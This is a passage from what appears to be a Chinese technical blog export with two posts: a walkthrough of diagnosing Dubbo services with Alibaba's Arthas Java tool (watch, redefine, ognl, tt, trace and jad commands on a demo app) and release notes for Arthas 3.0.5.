<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Reference</span>(version = <span class="string">"1.0.0"</span>)</span><br><span class="line">	<span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/user/&#123;id&#125;"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(@PathVariable Integer id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> userService.findUser(id);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>Server端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span>(version = <span class="string">"1.0.0"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> User <span class="title">findUser</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (id &lt; <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"user id &lt; 1, id: "</span> + id);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (User user : users) &#123;</span><br><span class="line">			<span class="keyword">if</span> (user.getId() == id) &#123;</span><br><span class="line">				<span class="keyword">return</span> user;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Can not find user, id: "</span> + id);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Arthas快速开始"><a href="#Arthas快速开始" class="headerlink" title="Arthas快速开始"></a>Arthas快速开始</h3><ul>
<li><a href="https://alibaba.github.io/arthas/install-detail.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/install-detail.html</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget https://alibaba.github.io/arthas/arthas-boot.jar</span><br><span class="line">$ java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>
<p>启动后，会列出所有的java进程，选择1，然后回车，就会连接上<code>ServerDemoApplication</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ java -jar arthas-boot.jar</span><br><span class="line">* [1]: 43523 ServerDemoApplication</span><br><span class="line">  [2]: 22342</span><br><span class="line">  [3]: 44108 ClientDemoApplication</span><br><span class="line">1</span><br><span class="line">[INFO] arthas home: /Users/hengyunabc/.arthas/lib/3.0.5/arthas</span><br><span class="line">[INFO] Try to attach process 43523</span><br><span class="line">[INFO] Attach process 43523 success.</span><br><span class="line">[INFO] arthas-client connect 127.0.0.1 3658</span><br><span class="line">  ,---.  ,------. ,--------.,--.  ,--.  ,---.   ,---.</span><br><span class="line"> /  O  \ |  .--. <span class="string">''</span>--.  .--<span class="string">'|  '</span>--<span class="string">'  | /  O  \ '</span>   .-<span class="string">'</span></span><br><span class="line"><span class="string">|  .-.  ||  '</span>--<span class="string">'.'</span>   |  |   |  .--.  ||  .-.  |`.  `-.</span><br><span class="line">|  | |  ||  |\  \    |  |   |  |  |  ||  | |  |.-<span class="string">'    |</span></span><br><span class="line"><span class="string">`--'</span> `--<span class="string">'`--'</span> <span class="string">'--'</span>   `--<span class="string">'   `--'</span>  `--<span class="string">'`--'</span> `--<span class="string">'`-----'</span></span><br><span class="line"></span><br><span class="line">wiki: https://alibaba.github.io/arthas</span><br><span class="line">version: 3.0.5</span><br><span class="line">pid: 43523</span><br><span class="line">time: 2018-12-05 16:23:52</span><br><span class="line"></span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h3 id="Dubbo线上服务抛出异常，怎么获取调用参数？"><a href="#Dubbo线上服务抛出异常，怎么获取调用参数？" class="headerlink" title="Dubbo线上服务抛出异常，怎么获取调用参数？"></a>Dubbo线上服务抛出异常，怎么获取调用参数？</h3><ul>
<li><a href="https://alibaba.github.io/arthas/watch.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/watch.html</a></li>
</ul>
<p>当线上服务抛出异常时，最着急的是什么参数导致了抛异常？</p>
<p>在demo里，访问 <a href="http://localhost:8080/user/0" target="_blank" rel="noopener">http://localhost:8080/user/0</a> ，<code>UserServiceImpl</code>就会抛出一个异常，因为user id不合法。</p>
<p>在Arthas里执行 <code>watch com.example.UserService * -e -x 2 &#39;{params,throwExp}&#39;</code> ，然后再次访问，就可以看到watch命令把参数和异常都打印出来了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ watch com.example.UserService * -e -x 2 &apos;&#123;params,throwExp&#125;&apos;</span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:4) cost in 230 ms.</span><br><span class="line">ts=2018-12-05 16:26:44; [cost=3.905523ms] result=@ArrayList[</span><br><span class="line">    @Object[][</span><br><span class="line">        @Integer[0],</span><br><span class="line">    ],</span><br><span class="line">    java.lang.IllegalArgumentException: user id &lt; 1, id: 0</span><br><span class="line">	at com.example.UserServiceImpl.findUser(UserServiceImpl.java:24)</span><br><span class="line">	at com.alibaba.dubbo.common.bytecode.Wrapper1.invokeMethod(Wrapper1.java)</span><br><span class="line">	at com.alibaba.dubbo.rpc.proxy.javassist.JavassistProxyFactory$1.doInvoke(JavassistProxyFactory.java:45)</span><br><span class="line">	at com.alibaba.dubbo.rpc.proxy.AbstractProxyInvoker.invoke(AbstractProxyInvoker.java:71)</span><br><span class="line">	at com.alibaba.dubbo.config.invoker.DelegateProviderMetaDataInvoker.invoke(DelegateProviderMetaDataInvoker.java:48)</span><br><span class="line">	at com.alibaba.dubbo.rpc.protocol.InvokerWrapper.invoke(InvokerWrapper.java:52)</span><br><span class="line">	at com.alibaba.dubbo.rpc.filter.ExceptionFilter.invoke(ExceptionFilter.java:61)</span><br></pre></td></tr></table></figure>
<h3 id="怎样线上调试Dubbo服务代码"><a href="#怎样线上调试Dubbo服务代码" class="headerlink" title="怎样线上调试Dubbo服务代码?"></a>怎样线上调试Dubbo服务代码?</h3><ul>
<li><a href="https://alibaba.github.io/arthas/redefine.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/redefine.html</a></li>
</ul>
<p>在本地开发时，可能会用到热部署工具，直接改代码，不需要重启应用。但是在线上环境，有没有办法直接动态调试代码？比如增加日志。</p>
<p>在Arthas里，可以通过<code>redefine</code>命令来达到线上不重启，动态更新代码的效果。</p>
<p>比如我们修改下<code>UserServiceImpl</code>，用<code>System.out</code>打印出具体的<code>User</code>对象来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">findUser</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (id &lt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"user id &lt; 1, id: "</span> + id);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (User user : users) &#123;</span><br><span class="line">		<span class="keyword">if</span> (user.getId() == id) &#123;</span><br><span class="line">			System.out.println(user);</span><br><span class="line">			<span class="keyword">return</span> user;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Can not find user, id: "</span> + id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地编绎后，把<code>server-demo/target/classes/com/example/UserServiceImpl.class</code>传到线上服务器，然后用<code>redefine</code>命令来更新代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ redefine -p /tmp/UserServiceImpl.class</span><br><span class="line">redefine success, size: 1</span><br></pre></td></tr></table></figure>
<p>这样子更新成功之后，访问 <a href="http://localhost:8080/user/1" target="_blank" rel="noopener">http://localhost:8080/user/1</a> ，在<code>ServerDemoApplication</code>的控制台里就可以看到打印出了user信息。</p>
<h3 id="怎样动态修改Dubbo的logger级别"><a href="#怎样动态修改Dubbo的logger级别" class="headerlink" title="怎样动态修改Dubbo的logger级别?"></a>怎样动态修改Dubbo的logger级别?</h3><ul>
<li><a href="https://alibaba.github.io/arthas/ognl.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/ognl.html</a></li>
<li><a href="https://alibaba.github.io/arthas/sc.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/sc.html</a></li>
<li><a href="https://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">https://commons.apache.org/proper/commons-ognl/language-guide.html</a></li>
</ul>
<p>在排查问题时，需要查看到更多的信息，如果可以把logger级别修改为<code>DEBUG</code>，就非常有帮助。</p>
<p><code>ognl</code>是apache开源的一个轻量级表达式引擎。下面通过Arthas里的<code>ognl</code>命令来动态修改logger级别。</p>
<p>首先获取Dubbo里<code>TraceFilter</code>的一个logger对象，看下它的实现类，可以发现是log4j。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ognl <span class="string">'@com.alibaba.dubbo.rpc.protocol.dubbo.filter.TraceFilter@logger.logger'</span></span><br><span class="line">@Log4jLogger[</span><br><span class="line">    FQCN=@String[com.alibaba.dubbo.common.logger.support.FailsafeLogger],</span><br><span class="line">    logger=@Logger[org.apache.log4j.Logger@2f19bdcf],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>再用<code>sc</code>命令来查看具体从哪个jar包里加载的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sc -d org.apache.log4j.Logger</span><br><span class="line"> class-info        org.apache.log4j.Logger</span><br><span class="line"> code-source       /Users/hengyunabc/.m2/repository/org/slf4j/log4j-over-slf4j/1.7.25/log4j-over-slf4j-1.7.25.jar</span><br><span class="line"> name              org.apache.log4j.Logger</span><br><span class="line"> isInterface       <span class="literal">false</span></span><br><span class="line"> isAnnotation      <span class="literal">false</span></span><br><span class="line"> isEnum            <span class="literal">false</span></span><br><span class="line"> isAnonymousClass  <span class="literal">false</span></span><br><span class="line"> isArray           <span class="literal">false</span></span><br><span class="line"> isLocalClass      <span class="literal">false</span></span><br><span class="line"> isMemberClass     <span class="literal">false</span></span><br><span class="line"> isPrimitive       <span class="literal">false</span></span><br><span class="line"> isSynthetic       <span class="literal">false</span></span><br><span class="line"> simple-name       Logger</span><br><span class="line"> modifier          public</span><br><span class="line"> annotation</span><br><span class="line"> interfaces</span><br><span class="line"> super-class       +-org.apache.log4j.Category</span><br><span class="line">                     +-java.lang.Object</span><br><span class="line"> class-loader      +-sun.misc.Launcher<span class="variable">$AppClassLoader</span>@5c647e05</span><br><span class="line">                     +-sun.misc.Launcher<span class="variable">$ExtClassLoader</span>@59878d35</span><br><span class="line"> classLoaderHash   5c647e05</span><br><span class="line"></span><br><span class="line">Affect(row-cnt:1) cost <span class="keyword">in</span> 126 ms.</span><br></pre></td></tr></table></figure>
<p><strong>可以看到log4j是通过slf4j代理的。</strong></p>
<p>那么通过<code>org.slf4j.LoggerFactory</code>获取<code>root</code> logger，再修改它的level：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ognl &apos;@org.slf4j.LoggerFactory@getLogger(&quot;root&quot;).setLevel(@ch.qos.logback.classic.Level@DEBUG)&apos;</span><br><span class="line">null</span><br><span class="line">$ ognl &apos;@org.slf4j.LoggerFactory@getLogger(&quot;root&quot;).getLevel().toString()&apos;</span><br><span class="line">@String[DEBUG]</span><br></pre></td></tr></table></figure>
<p>可以看到修改之后，<code>root</code> logger的level变为<code>DEBUG</code>。</p>
<h3 id="怎样减少测试小姐姐重复发请求的麻烦"><a href="#怎样减少测试小姐姐重复发请求的麻烦" class="headerlink" title="怎样减少测试小姐姐重复发请求的麻烦?"></a>怎样减少测试小姐姐重复发请求的麻烦?</h3><ul>
<li><a href="https://alibaba.github.io/arthas/tt.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/tt.html</a></li>
</ul>
<p>在平时开发时，可能需要测试小姐姐发请求过来联调，但是我们在debug时，可能不小心直接跳过去了。这样子就尴尬了，需要测试小姐姐再发请求过来。</p>
<p>Arthas里提供了<code>tt</code>命令，可以减少这种麻烦，可以直接重放请求。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tt -t com.example.UserServiceImpl findUser</span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost <span class="keyword">in</span> 145 ms.</span><br><span class="line"> INDEX      TIMESTAMP              COST(ms)      IS-RET     IS-EXP    OBJECT       CLASS              METHOD</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line"> 1000       2018-12-05 17:47:52    1.56523       <span class="literal">true</span>       <span class="literal">false</span>     0x3233483    UserServiceImpl    findUser</span><br><span class="line"> 1001       2018-12-05 17:48:03    0.286176      <span class="literal">false</span>      <span class="literal">true</span>      0x3233483    UserServiceImpl    findUser</span><br><span class="line"> 1002       2018-12-05 17:48:11    90.324335     <span class="literal">true</span>       <span class="literal">false</span>     0x3233483    UserServiceImpl    findUser</span><br></pre></td></tr></table></figure>
<p>上面的<code>tt -t</code>命令捕获到了3个请求。然后通过<code>tt --play</code>可以重放请求：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tt --play -i 1000</span><br><span class="line"> RE-INDEX       1000</span><br><span class="line"> GMT-REPLAY     2018-12-05 17:55:50</span><br><span class="line"> OBJECT         0x3233483</span><br><span class="line"> CLASS          com.example.UserServiceImpl</span><br><span class="line"> METHOD         findUser</span><br><span class="line"> PARAMETERS[0]  @Integer[1]</span><br><span class="line"> IS-RETURN      <span class="literal">true</span></span><br><span class="line"> IS-EXCEPTION   <span class="literal">false</span></span><br><span class="line"> RETURN-OBJ     @User[</span><br><span class="line">                    id=@Integer[1],</span><br><span class="line">                    name=@String[Deanna Borer],</span><br><span class="line">                ]</span><br><span class="line">Time fragment[1000] successfully replayed.</span><br><span class="line">Affect(row-cnt:1) cost <span class="keyword">in</span> 4 ms.</span><br></pre></td></tr></table></figure>
<h3 id="Dubbo运行时有哪些Filter-耗时是多少"><a href="#Dubbo运行时有哪些Filter-耗时是多少" class="headerlink" title="Dubbo运行时有哪些Filter? 耗时是多少?"></a>Dubbo运行时有哪些Filter? 耗时是多少?</h3><ul>
<li><a href="https://alibaba.github.io/arthas/trace.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/trace.html</a></li>
</ul>
<p>Dubbo运行时会加载很多的Filter，那么一个请求会经过哪些Filter处理，Filter里的耗时又是多少呢？</p>
<p>通过Arthas的<code>trace</code>命令，可以很方便地知道Filter的信息，可以看到详细的调用栈和耗时。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ trace com.alibaba.dubbo.rpc.Filter *</span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:19 , method-cnt:59) cost <span class="keyword">in</span> 1441 ms.</span><br><span class="line">`---ts=2018-12-05 19:07:26;thread_name=DubboServerHandler-30.5.125.152:20880-thread-10;id=3e;is_daemon=<span class="literal">true</span>;priority=5;TCCL=sun.misc.Launcher<span class="variable">$AppClassLoader</span>@5c647e05</span><br><span class="line">    `---[8.435844ms] com.alibaba.dubbo.rpc.filter.EchoFilter:invoke()</span><br><span class="line">        +---[0.124572ms] com.alibaba.dubbo.rpc.Invocation:getMethodName()</span><br><span class="line">        +---[0.065123ms] java.lang.String:equals()</span><br><span class="line">        `---[7.762928ms] com.alibaba.dubbo.rpc.Invoker:invoke()</span><br><span class="line">            `---[7.494124ms] com.alibaba.dubbo.rpc.filter.ClassLoaderFilter:invoke()</span><br><span class="line">                +---[min=0.00355ms,max=0.049922ms,total=0.057637ms,count=3] java.lang.Thread:currentThread()</span><br><span class="line">                +---[0.0126ms] java.lang.Thread:getContextClassLoader()</span><br><span class="line">                +---[0.02188ms] com.alibaba.dubbo.rpc.Invoker:getInterface()</span><br><span class="line">                +---[0.004115ms] java.lang.Class:getClassLoader()</span><br><span class="line">                +---[min=0.003906ms,max=0.014058ms,total=0.017964ms,count=2] java.lang.Thread:setContextClassLoader()</span><br><span class="line">                `---[7.033486ms] com.alibaba.dubbo.rpc.Invoker:invoke()</span><br><span class="line">                    `---[6.869488ms] com.alibaba.dubbo.rpc.filter.GenericFilter:invoke()</span><br><span class="line">                        +---[0.01481ms] com.alibaba.dubbo.rpc.Invocation:getMethodName()</span><br></pre></td></tr></table></figure>
<h3 id="Dubbo动态代理是怎样实现的"><a href="#Dubbo动态代理是怎样实现的" class="headerlink" title="Dubbo动态代理是怎样实现的?"></a>Dubbo动态代理是怎样实现的?</h3><ul>
<li><a href="https://alibaba.github.io/arthas/jad.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/jad.html</a></li>
<li>com.alibaba.dubbo.common.bytecode.Wrapper</li>
</ul>
<p>通过Arthas的<code>jad</code>命令，可以看到Dubbo通过javaassist动态生成的Wrappr类的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ jad com.alibaba.dubbo.common.bytecode.Wrapper1</span><br><span class="line"></span><br><span class="line">ClassLoader:</span><br><span class="line">+-sun.misc.Launcher$AppClassLoader@<span class="number">5</span>c647e05</span><br><span class="line">  +-sun.misc.Launcher$ExtClassLoader@<span class="number">59878</span>d35</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line">/Users/hengyunabc/.m2/repository/com/alibaba/dubbo/<span class="number">2.5</span><span class="number">.10</span>/dubbo-<span class="number">2.5</span><span class="number">.10</span>.jar</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.alibaba.dubbo.common.bytecode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wrapper1</span></span></span><br><span class="line"><span class="class"><span class="keyword">extends</span> <span class="title">Wrapper</span></span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">ClassGenerator</span>.<span class="title">DC</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invokeMethod</span><span class="params">(Object object, String string, Class[] arrclass, Object[] arrobject)</span> <span class="keyword">throws</span> InvocationTargetException </span>&#123;</span><br><span class="line">        UserServiceImpl userServiceImpl;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            userServiceImpl = (UserServiceImpl)object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(throwable);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"findUser"</span>.equals(string) &amp;&amp; arrclass.length == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> userServiceImpl.findUser(((Number)arrobject[<span class="number">0</span>]).intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"listUsers"</span>.equals(string) &amp;&amp; arrclass.length == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> userServiceImpl.listUsers();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"findUserByName"</span>.equals(string) &amp;&amp; arrclass.length == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> userServiceImpl.findUserByName((String)arrobject[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取Spring-context"><a href="#获取Spring-context" class="headerlink" title="获取Spring context"></a>获取Spring context</h3><p>除了上面介绍的一些排查技巧，下面分享一个获取Spring Context，然后“为所欲为”的例子。</p>
<p>在Dubbo里有一个扩展<code>com.alibaba.dubbo.config.spring.extension.SpringExtensionFactory</code>，把Spring Context保存到了里面。<br>因此，我们可以通过<code>ognl</code>命令获取到。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ognl <span class="string">'#context=@com.alibaba.dubbo.config.spring.extension.SpringExtensionFactory@contexts.iterator.next, #context.getBean("userServiceImpl").findUser(1)'</span></span><br><span class="line">@User[</span><br><span class="line">    id=@Integer[1],</span><br><span class="line">    name=@String[Deanna Borer],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="mailto:`SpringExtensionFactory@contexts.iterator.next" target="_blank" rel="noopener">`SpringExtensionFactory@contexts.iterator.next</a><code>获取到</code>SpringExtensionFactory`里保存的spring context对象</li>
<li><code>#context.getBean(&quot;userServiceImpl&quot;).findUser(1)</code> 获取到<code>userServiceImpl</code>再执行一次调用</li>
</ul>
<p>只要充分发挥想像力，组合Arthas里的各种命令，可以发挥出神奇的效果。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章来自杭州Dubbo Meetup的分享《当DUBBO遇上Arthas - 排查问题的实践》，希望对大家线上排查Dubbo问题有帮助。</p>
<p>分享的PDF可以在 <a href="https://github.com/alibaba/arthas/issues/327" target="_blank" rel="noopener">https://github.com/alibaba/arthas/issues/327</a> 里下载。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Alibaba应用诊断利器Arthas 3.0.5版本发布：提升全平台用户体验</title>
    <url>/arthas-3.0.5/</url>
    <content><![CDATA[<p>Arthas从9月份开源以来，受到广大Java开发者的支持，Github Star数三个月超过6000，非常感谢用户支持。同时用户给Arthas提出了很多建议，其中反映最多的是：</p>
<ol>
<li>Windows平台用户体验不好</li>
<li>Attach的进程和最终连接的进程不一致</li>
<li>某些环境下没有安装Telnet，不能连接到Arthas Server</li>
<li>本地启动，不需要下载远程（很多公司安全考虑）</li>
<li>下载速度慢（默认从maven central repository下载）</li>
</ol>
<p>在Arthas 3.0.5版本里，我们在用户体验方面做了很多改进，下面逐一介绍。</p>
<ul>
<li>Github: <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>文档：<a href="https://alibaba.github.io/arthas/" target="_blank" rel="noopener">https://alibaba.github.io/arthas/</a></li>
</ul>
<h3 id="全平台通用的arthas-boot"><a href="#全平台通用的arthas-boot" class="headerlink" title="全平台通用的arthas-boot"></a>全平台通用的arthas-boot</h3><p><code>arthas-boot</code>是新增加的支持全平台的启动器，Windows/Mac/Linux下使用体验一致。下载后，直接<code>java -jar</code>命令启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://alibaba.github.io/arthas/arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>
<p><code>arthas-boot</code>的功能比以前的<code>as.sh</code>更强大。</p>
<ul>
<li><p>比如下载速度比较慢，可以指定阿里云的镜像。</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar arthas-boot.jar --repo-mirror aliyun --use-http</span><br></pre></td></tr></table></figure>
</li>
<li><p>比如可以通过<code>session-timeout</code>指定超时时间：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar arthas-boot.jar --session-timeout 3600</span><br></pre></td></tr></table></figure>
</li>
<li><p>更多的功能可以通过<code>java -jar arthas-boot.jar -h</code>查看</p>
</li>
</ul>
<p><code>arthas-boot</code>在attach成功之后，会启动一个java telent client去连接Arthas Server，用户没有安装telnet的情况下也可以正常使用。</p>
<h3 id="优先使用当前目录的Arthas"><a href="#优先使用当前目录的Arthas" class="headerlink" title="优先使用当前目录的Arthas"></a>优先使用当前目录的Arthas</h3><p>在新版本里，默认会从<code>arthas-boot.jar</code>和<code>as.sh</code>所在的目录下查找arthas home，这样子用户全量安装之后，不需要再从远程下载Arthas。</p>
<ul>
<li>用户可以更方便地集成到自己的基础镜像，或者docker镜像里</li>
<li>对安全要求严格的公司，不用再担心从远程下载的问题</li>
</ul>
<h3 id="Attach之前先检测端口"><a href="#Attach之前先检测端口" class="headerlink" title="Attach之前先检测端口"></a>Attach之前先检测端口</h3><p>在之前的版本里，用户困扰最多的是，明明选择了进程A，但是实际连接到的却是进程B。</p>
<p>原因是之前attach了进程B，没有执行<code>shutdown</code>，下次再执行时，还是连接到进程B。</p>
<p>在新版本里，做了改进：</p>
<ul>
<li>在attach之前，检测使用3658端口的进程</li>
<li>在Attach时，如果端口和进程不匹配，会打印出ERROR信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ java -jar arthas-boot.jar</span><br><span class="line">[INFO] Process 1680 already using port 3658</span><br><span class="line">[INFO] Process 1680 already using port 8563</span><br><span class="line">* [1]: 1680 Demo</span><br><span class="line">  [2]: 35542</span><br><span class="line">  [3]: 82334 Demo</span><br><span class="line">3</span><br><span class="line">[ERROR] Target process 82334 is not the process using port 3658, you will connect to an unexpected process.</span><br><span class="line">[ERROR] If you still want to attach target process 82334, Try to <span class="built_in">set</span> a different telnet port by using --telnet-port argument.</span><br><span class="line">[ERROR] Or try to shutdown the process 1680 using the telnet port first.</span><br></pre></td></tr></table></figure>
<h3 id="更好的历史命令匹配功能"><a href="#更好的历史命令匹配功能" class="headerlink" title="更好的历史命令匹配功能"></a>更好的历史命令匹配功能</h3><ul>
<li><p>新版本对键盘<code>Up/Down</code>有了更好的匹配机制，试用有惊喜:)</p>
<p>  比如执行了多次trace，但是在命令行输入 trace后，想不起来之前trace的具体类名，那么按<code>Up</code>，可以很轻松地匹配到之前的历史命令，不需要辛苦翻页。</p>
</li>
<li><p>新版本增加了<code>history</code>命令</p>
</li>
</ul>
<h3 id="改进Web-Console的体验"><a href="#改进Web-Console的体验" class="headerlink" title="改进Web Console的体验"></a>改进Web Console的体验</h3><ul>
<li><p>改进对Windows的字体支持</p>
<p>  之前Windows下面使用的是非等宽字体，看起来很难受。新版本里统一为等宽字体。</p>
</li>
<li>增大字体，不再伤害眼睛</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/1683936/49217204-f2c8e280-f407-11e8-9314-65f04a9e55da.png" alt="image"></p>
<h3 id="新增sysenv命令"><a href="#新增sysenv命令" class="headerlink" title="新增sysenv命令"></a>新增sysenv命令</h3><p>sysenv命令和sysprop类似，可以打印JVM的环境变量。</p>
<ul>
<li><a href="https://alibaba.github.io/arthas/sysenv.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/sysenv.html</a></li>
</ul>
<h3 id="新增ognl命令"><a href="#新增ognl命令" class="headerlink" title="新增ognl命令"></a>新增ognl命令</h3><p>ognl命令提供了单独执行ognl脚本的功能。可以很方便调用各种代码。</p>
<p>比如执行多行表达式，赋值给临时变量，返回一个List：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ ognl <span class="string">'#value1=@System@getProperty("java.home"), #value2=@System@getProperty("java.runtime.name"), &#123;#value1, #value2&#125;'</span></span><br><span class="line"><span class="meta">@ArrayList</span>[</span><br><span class="line">    <span class="meta">@String</span>[/opt/java/<span class="number">8.0</span><span class="number">.181</span>-zulu/jre],</span><br><span class="line">    <span class="meta">@String</span>[OpenJDK Runtime Environment],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://alibaba.github.io/arthas/ognl.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/ognl.html</a></li>
</ul>
<h3 id="watch命令打印耗时，更方便定位性能瓶颈"><a href="#watch命令打印耗时，更方便定位性能瓶颈" class="headerlink" title="watch命令打印耗时，更方便定位性能瓶颈"></a>watch命令打印耗时，更方便定位性能瓶颈</h3><p>之前watch命令只支持打印入参返回值等，新版本同时打印出调用耗时，可以很方便定位性能瓶颈。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ watch demo.MathGame primeFactors <span class="string">'params[0]'</span></span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost <span class="keyword">in</span> 22 ms.</span><br><span class="line">ts=2018-11-29 17:53:54; [cost=0.131383ms] result=@Integer[-387929024]</span><br><span class="line">ts=2018-11-29 17:53:55; [cost=0.132368ms] result=@Integer[-1318275764]</span><br><span class="line">ts=2018-11-29 17:53:56; [cost=0.496598ms] result=@Integer[76446257]</span><br><span class="line">ts=2018-11-29 17:53:57; [cost=4.9617ms] result=@Integer[1853966253]</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://alibaba.github.io/arthas/watch.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/watch.html</a></li>
</ul>
<h3 id="改进类搜索匹配功能，更好支持lambda和内部类"><a href="#改进类搜索匹配功能，更好支持lambda和内部类" class="headerlink" title="改进类搜索匹配功能，更好支持lambda和内部类"></a>改进类搜索匹配功能，更好支持lambda和内部类</h3><p>之前的版本里，在搜索lambda类时，或者反编绎lambda类有可能会失败。新版本做了修复。比如</p>
